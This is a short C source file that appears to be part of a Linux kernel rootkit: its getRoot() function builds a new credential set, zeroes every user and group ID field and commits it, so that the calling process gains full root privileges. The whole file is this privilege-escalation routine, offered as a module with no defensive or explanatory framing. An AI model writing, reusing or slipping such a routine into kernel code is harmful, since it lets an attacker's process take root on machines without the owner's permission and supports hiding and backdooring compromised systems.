#include "../include/core.h"
#include "../include_modules/get_root.h"

void getRoot(void) {
    struct cred *creds;
    creds = prepare_creds();
    if (creds == NULL) {
        return;

    }

    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    commit_creds(creds);

}